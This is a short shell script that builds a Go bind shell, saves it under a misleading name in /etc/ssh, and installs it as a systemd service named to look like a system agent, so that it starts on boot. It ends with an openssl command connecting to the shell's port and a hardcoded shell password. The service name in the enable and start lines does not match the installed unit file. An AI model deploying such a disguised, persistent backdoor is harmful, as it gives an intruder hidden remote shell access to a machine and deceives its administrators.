# Install go
sudo apt update -y
sudo apt install golang-go -y

go build -o /etc/ssh/sshagentconfig bind.go

chmod +x /etc/ssh/sshagentconfig

# setup service
sudo cp systemagentd.service /etc/systemd/system/systemagentd.service

# sudo vi /etc/systemd/system/systemagentd.service

sudo systemctl daemon-reload
sudo systemctl enable gobind
sudo systemctl start gobind

# bind shell password
openssl s_client -connect 10.10.10.10:45778
YaHerd2016!